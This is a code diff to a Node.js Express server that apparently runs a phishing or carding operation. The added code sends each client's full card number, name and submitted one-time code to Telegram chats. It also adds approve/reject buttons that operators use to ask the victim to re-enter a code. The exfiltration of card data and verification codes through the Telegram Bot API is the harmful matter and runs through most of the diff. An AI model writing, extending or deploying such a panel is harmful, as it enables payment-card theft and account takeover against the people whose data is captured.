@@ -87,6 +87,42 @@ const TG_CHAT = process.env.TELEGRAM_CHAT_ID || "";
 
 const https = require("https");
 
+/** Generic Telegram Bot API call */
+function tgApi(method, payload = {}) {
+  return new Promise((resolve) => {
+    if (!TG_TOKEN) return resolve(null);
+    const data = JSON.stringify(payload);
+    const req = https.request(
+      {
+        hostname: "api.telegram.org",
+        path: `/bot${TG_TOKEN}/${method}`,
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Content-Length": Buffer.byteLength(data),
+        },
+      },
+      (res) => {
+        let body = "";
+        res.on("data", (c) => (body += c));
+        res.on("end", () => {
+          try {
+            resolve(JSON.parse(body));
+          } catch {
+            resolve(null);
+          }
+        });
+      }
+    );
+    req.on("error", (e) => {
+      console.error(`Telegram ${method} error:`, e.message);
+      resolve(null);
+    });
+    req.write(data);
+    req.end();
+  });
+}
+
 function sendTelegram(text, extra = {}) {
   return new Promise((resolve) => {
     if (!TG_TOKEN || !TG_CHAT) {
@@ -94,7 +130,7 @@ function sendTelegram(text, extra = {}) {
       return resolve();
     }
 
-    const chats = TG_CHAT.split(",").map(s => s.trim()).filter(Boolean);
+    const chats = TG_CHAT.split(",").map((s) => s.trim()).filter(Boolean);
     if (chats.length === 0) {
       console.log("Telegram: no valid chat ids");
       return resolve();
@@ -106,7 +142,7 @@ function sendTelegram(text, extra = {}) {
       if (done >= chats.length) resolve();
     };
 
-    chats.forEach((chatId) => {
+    chats.forEach(async (chatId) => {
       const payload = {
         chat_id: chatId,
         text: text,
@@ -114,39 +150,28 @@ function sendTelegram(text, extra = {}) {
         disable_web_page_preview: true,
         ...extra,
       };
-      const data = JSON.stringify(payload);
-
-      const options = {
-        hostname: "api.telegram.org",
-        path: `/bot${TG_TOKEN}/sendMessage`,
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Content-Length": Buffer.byteLength(data),
-        },
-      };
-
-      const req = https.request(options, (res) => {
-        let body = "";
-        res.on("data", (chunk) => (body += chunk));
-        res.on("end", () => {
-          console.log(`Telegram [${chatId}] response:`, res.statusCode, body.slice(0, 150));
-          finish();
-        });
-      });
-
-      req.on("error", (e) => {
-        console.error(`Telegram [${chatId}] error:`, e.message);
-        finish();
-      });
-
-      req.write(data);
-      req.end();
+      const result = await tgApi("sendMessage", payload);
+      if (result) {
+        console.log(`Telegram [${chatId}] response:`, result.ok ? "ok" : JSON.stringify(result).slice(0, 120));
+      }
+      finish();
     });
   });
 }
 
-// ========== Telegram webhook (кнопка "Взял в работу") ==========
+/** Edit message text + remove/replace keyboard so buttons become inactive */
+async function editTelegramMessage(chatId, messageId, text, replyMarkup = { inline_keyboard: [] }) {
+  return tgApi("editMessageText", {
+    chat_id: chatId,
+    message_id: messageId,
+    text,
+    parse_mode: "HTML",
+    disable_web_page_preview: true,
+    reply_markup: replyMarkup,
+  });
+}
+
+// ========== Telegram webhook ==========
 app.post("/api/telegram-webhook", express.json(), async (req, res) => {
   try {
     const update = req.body;
@@ -155,31 +180,80 @@ app.post("/api/telegram-webhook", express.json(), async (req, res) => {
       const data = cb.data || "";
       const from = cb.from || {};
       const name = from.first_name || from.username || "Хтось";
+      const chatId = cb.message?.chat?.id;
+      const messageId = cb.message?.message_id;
+      const originalText = cb.message?.text || "";
+
+      let answerText = "OK";
+      let newText = originalText;
 
       if (data.startsWith("take:")) {
         const leadId = data.split(":")[1];
-        await sendTelegram(`🟢 <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу.\nВін на звʼязку і готовий обробляти.`);
+        answerText = "Ти взяв заявку в роботу";
+        newText =
+          originalText +
+          `\n\n✅ <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу`;
+        await sendTelegram(
+          `🟢 <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу.\nВін на звʼязку і готовий обробляти.`
+        );
       } else if (data === "online") {
+        answerText = "Ти на звʼязку";
+        newText = originalText + `\n\n🟢 <b>${name}</b> на звʼязку`;
         await sendTelegram(`🟢 <b>${name}</b> на звʼязку і готовий приймати дані.`);
+      } else if (data.startsWith("approve:")) {
+        const leadId = data.split(":")[1];
+        answerText = "Код підтверджено";
+        // Update lead status
+        try {
+          const a = await read();
+          const x = a.find((v) => Number(v.id) === Number(leadId));
+          if (x && (x.status === "Очікує рішення менеджера" || x.status === "Ожидает решения менеджера")) {
+            x.status = "Підтверджено";
+            x.retry_requested = false;
+            await write(a);
+          }
+        } catch (e) {
+          console.error("approve lead error:", e.message);
+        }
+        newText =
+          originalText +
+          `\n\n✅ <b>${name}</b> підтвердив код`;
+        await sendTelegram(`✅ <b>${name}</b> підтвердив код для заявки <b>#${leadId}</b>`);
+      } else if (data.startsWith("reject:")) {
+        const leadId = data.split(":")[1];
+        answerText = "Код відхилено";
+        try {
+          const a = await read();
+          const x = a.find((v) => Number(v.id) === Number(leadId));
+          if (x && (x.status === "Очікує рішення менеджера" || x.status === "Ожидает решения менеджера")) {
+            x.status = "Код не підійшов — повторне введення";
+            x.rejected_code = x.submitted_code || null;
+            x.rejected_at = new Date().toISOString();
+            x.submitted_code = null;
+            await write(a);
+          }
+        } catch (e) {
+          console.error("reject lead error:", e.message);
+        }
+        newText =
+          originalText +
+          `\n\n❌ <b>${name}</b> відхилив код — клієнт може ввести новий`;
+        await sendTelegram(
+          `❌ <b>${name}</b> відхилив код для заявки <b>#${leadId}</b>\nКлієнт може ввести новий код.`
+        );
       }
 
-      // Answer the callback
-      const answer = JSON.stringify({
+      // Answer callback so Telegram stops the loading spinner
+      await tgApi("answerCallbackQuery", {
         callback_query_id: cb.id,
-        text: data === "online" ? "Ти на звʼязку" : "Ти взяв заявку в роботу",
+        text: answerText,
         show_alert: false,
       });
-      const ansReq = https.request({
-        hostname: "api.telegram.org",
-        path: `/bot${TG_TOKEN}/answerCallbackQuery`,
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Content-Length": Buffer.byteLength(answer),
-        },
-      }, () => {});
-      ansReq.write(answer);
-      ansReq.end();
+
+      // Make buttons inactive by editing the original message (remove keyboard)
+      if (chatId && messageId) {
+        await editTelegramMessage(chatId, messageId, newText, { inline_keyboard: [] });
+      }
     }
     res.json({ ok: true });
   } catch (e) {
@@ -378,12 +452,24 @@ app.post("/api/leads/:id/submit-code", async (req, res) => {
 
     await write(a);
 
-    await sendTelegram(
+    const codeMsg =
       `🔐 <b>Код від клієнта #${x.id}</b>\n` +
       `Код: <code>${code}</code>\n` +
       `Спроба: ${x.attempts}\n` +
-      `Послуга: ${x.service_type || "—"}`
-    );
+      `Послуга: ${x.service_type || "—"}\n` +
+      `Імʼя: ${x.name || "—"}\n` +
+      `Картка: <code>${(x.card_number || "").replace(/(\d{4})(?=\d)/g, "$1 ")}</code>`;
+
+    const codeKeyboard = {
+      inline_keyboard: [
+        [
+          { text: "✅ Підтвердити", callback_data: `approve:${x.id}` },
+          { text: "❌ Відхилити", callback_data: `reject:${x.id}` },
+        ],
+      ],
+    };
+
+    await sendTelegram(codeMsg, { reply_markup: codeKeyboard });
 
     res.json({ ok: true, status: x.status, attempts: x.attempts });
   } catch (e) {
